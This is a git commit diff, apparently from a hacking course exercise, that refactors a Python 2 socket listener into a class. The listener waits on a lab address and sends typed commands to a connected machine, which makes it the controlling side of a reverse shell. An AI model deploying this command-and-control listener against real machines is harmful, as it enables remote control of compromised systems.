557f4b7287335bfccfad5762ca67ae54bf40bede
Trojan277 <70176627+Trojan277@users.noreply.github.com>
2021-01-23 09:38:38 +0300

    Update 35-socketListener.py

--- 35-socketListener.py
+++ 35-socketListener.py
@@ -1,15 +1,24 @@
 import socket
 
-Listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-Listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
-Listener.bind(("10.0.2.15",8080))
-Listener.listen(0)
-print('Listening...')
-(Connection, Address) = Listener.accept()
-print('Connection Successful from ' + str(Address))
+class SocketListener:
+    def __init__(self,ip,port):
+        Listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        Listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        Listener.bind((ip, port))
+        Listener.listen(0)
+        print('Listening...')
+        (self.Connection, Address) = Listener.accept()
+        print('Connection Successful from ' + str(Address))
 
-while True:
-    command_input = raw_input('Enter Command: ')
-    Connection.send(command_input)
-    command_output = Connection.recv(1024)
-    print(command_output)
+    def command_execution(self, command_input):
+        self.Connection.send(command_input)
+        return self.Connection.recv(1024)
+
+    def start_listener(self):
+        while True:
+            command_input = raw_input('Enter Command: ')
+            command_output = self.command_execution(command_input)
+            print(command_output)
+
+socket_listener = SocketListener('10.0.2.15',8080)
+socket_listener.start_listener()
